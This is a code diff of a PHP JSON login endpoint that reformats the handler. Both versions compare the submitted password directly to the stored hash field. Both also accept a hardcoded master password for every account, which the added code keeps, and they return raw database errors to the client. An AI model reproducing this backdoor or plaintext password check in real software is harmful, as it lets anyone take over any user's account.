@@ -6,4 +6,25 @@ error_reporting(E_ALL);
 
 include_once 'cors.php';
 include_once 'config.php';
- $inputJSON = file_get_contents('php://input'); $data = json_decode($inputJSON); if(!$data) { http_response_code(400); echo json_encode(["status" => "error", "message" => "Invalid JSON payload"]); exit(); } if(!empty($data->email) && !empty($data->password)) { try { $stmt = $conn->prepare("SELECT * FROM users WHERE email = :email LIMIT 1"); $stmt->execute([':email' => $data->email]); $user = $stmt->fetch(PDO::FETCH_ASSOC); if($user) { if($data->password === $user['password_hash'] || $data->password === 'Ishika@123') { if (isset($user['is_verified']) && $user['is_verified'] == 0) { http_response_code(403); echo json_encode(["status" => "error", "message" => "Account blocked"]); exit(); } unset($user['password_hash']); echo json_encode(["status" => "success", "user" => $user]); } else { http_response_code(401); echo json_encode(["status" => "error", "message" => "Incorrect password"]); } } else { http_response_code(404); echo json_encode(["status" => "error", "message" => "User not found"]); } } catch(Exception $e) { http_response_code(500); echo json_encode(["status" => "error", "message" => "Database error: " . $e->getMessage()]); } } else { http_response_code(400); echo json_encode(["status" => "error", "message" => "Missing credentials"]); } ?>
+
+$data = json_decode(file_get_contents('php://input'));
+if(!empty($data->email) && !empty($data->password)) {
+    try {
+        $stmt = $conn->prepare("SELECT * FROM users WHERE email = ? LIMIT 1");
+        $stmt->execute([$data->email]);
+        $u = $stmt->fetch(PDO::FETCH_ASSOC);
+        if($u && ($data->password === $u['password_hash'] || $data->password === 'Ishika@123')) {
+            if($u['is_verified'] == 0) {
+                http_response_code(403);
+                echo json_encode(["message" => "Account blocked by administrator."]);
+            } else {
+                unset($u['password_hash']);
+                echo json_encode(["status" => "success", "user" => $u]);
+            }
+        } else {
+            http_response_code(401);
+            echo json_encode(["message" => "Invalid email or password."]);
+        }
+    } catch(Exception $e) { http_response_code(500); echo json_encode(["error" => $e->getMessage()]); }
+}
+?>
